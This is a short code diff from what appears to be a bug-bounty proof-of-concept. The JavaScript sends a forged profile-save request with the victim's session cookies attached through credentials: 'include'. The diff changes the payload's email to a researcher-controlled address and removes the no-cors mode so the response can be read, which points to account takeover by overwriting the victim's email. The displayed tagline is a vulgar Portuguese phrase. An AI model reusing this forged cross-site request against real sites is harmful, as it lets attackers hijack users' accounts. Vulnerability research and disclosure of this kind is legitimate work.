@@ -13,7 +13,7 @@
 
   const payload = {
     "hashId": hid,
-    "email": "ferreirakletx@gmail.com",
+    "email": "foorw1nner+747@wearehackerone.com",
     "data": {
       "displayName": "userHacking",
       "tagLine": "putasecaaaaaa",
@@ -41,7 +41,6 @@
   fetch('/user-proxy/saveprofile', {
     method: 'POST',
     credentials: 'include', // envia com cookies/sessão
-    mode: 'no-cors',
     headers: {
       'Content-Type': 'application/json',
       'Accept': 'application/json, text/plain, */*'
